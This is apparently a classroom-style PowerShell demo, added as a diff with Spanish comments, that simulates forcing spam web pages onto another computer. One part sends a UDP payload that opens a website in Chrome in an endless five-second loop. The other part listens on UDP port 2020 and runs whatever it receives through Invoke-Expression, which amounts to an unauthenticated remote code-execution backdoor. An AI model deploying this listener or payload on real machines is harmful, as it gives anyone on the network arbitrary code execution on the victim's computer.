@@ -1,0 +1,32 @@
+#Simulación de como se podría atacar un ordenador para abrirle publidad spam en el buscador
+#Podríamos monitorizar la red con NMAP y ver los puertos que estuvieran abiertos para enviarle un scrip por ese puerto 
+
+#ORDENADOR1
+########################################################################
+
+##Envia scrip a PC2 para qhe este abra una página web cada cierto tiempo
+
+Start-Process chrome https://www.jesusninoc.com
+$port=2020
+$endpoint = new-object System.Net.IPEndPoint ([IPAddress]"192.168.1.115",$port)
+$udpclient=new-Object System.Net.Sockets.UdpClient
+$b=[Text.Encoding]::ASCII.GetBytes("
+while(2) {
+Start-Process chrome https://www.jesusninoc.com
+Start-Sleep -Seconds 5
+}
+")
+$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
+$udpclient.Close()
+
+#ORDENADOR2
+########################################################################
+
+##PC2 con un puerto abierto escuchando
+
+$port=2020
+$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::any,$port)
+$udpclient=new-Object System.Net.Sockets.UdpClient $port
+$content=$udpclient.Receive([ref]$endpoint)
+[Text.Encoding]::ASCII.GetString($content) | iex
+$udpclient.Dispose()
